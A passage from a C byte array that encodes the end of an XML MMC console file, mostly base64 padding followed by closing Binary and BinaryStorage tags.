	0x0D, 0x0A, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x0D, 0x0A,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x0D, 0x0A, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x0D, 0x0A, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x0D, 0x0A, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x0D, 0x0A, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x3D, 0x3D, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x2F, 0x42, 0x69, 0x6E, 0x61,
	0x72, 0x79, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x42, 0x69, 0x6E, 0x61, 0x72, 0x79,
	0x3E, 0x0D, 0x0A, 0x41, 0x51, 0x41, 0x41, 0x41, 0x42, 0x51, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x42, 0x41, 0x41, 0x41, 0x41, 0x50, 0x2F, 0x2F, 0x2F, 0x2F, 0x38, 0x3D, 0x0D,
	0x0A, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x2F, 0x42, 0x69, 0x6E, 0x61, 0x72, 0x79, 0x3E, 0x0D, 0x0A,
	0x20, 0x20, 0x3C, 0x2F, 0x42, 0x69, 0x6E, 0x61, 0x72, 0x79, 0x53, 0x74, 0x6F, 0x72, 0x61, 0x67,
	0x65, 0x3E, 0x0D, 0x0A, 0x3C, 0x2F, 0x4D, 0x4D, 0x43, 0x5F, 0x43, 0x6F, 0x6E, 0x73, 0x6F, 0x6C,
	0x65, 0x46, 0x69, 0x6C, 0x65, 0x3E
};
